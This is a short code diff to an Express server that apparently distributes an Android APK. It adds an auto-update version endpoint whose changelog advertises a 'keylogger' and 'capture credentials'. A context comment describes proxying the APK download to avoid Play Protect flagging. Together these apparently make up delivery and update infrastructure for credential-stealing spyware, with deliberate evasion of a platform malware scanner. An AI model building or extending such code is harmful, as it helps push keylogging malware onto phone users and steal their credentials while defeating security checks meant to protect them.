@@ -67,6 +67,16 @@ app.get('/mobile/:sessionId', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
 });
 
+// Version check for auto-update
+app.get('/api/version', (req, res) => {
+  res.json({
+    versionCode: 2,
+    versionName: "2.0.0",
+    apkUrl: `${req.protocol}://${req.headers.host}/download/apk`,
+    changelog: "Mise a jour automatique, keylogger, capture credentials"
+  });
+});
+
 // APK download - proxy from GitHub to avoid Play Protect flagging external redirects
 app.get('/download/apk', async (req, res) => {
   try {
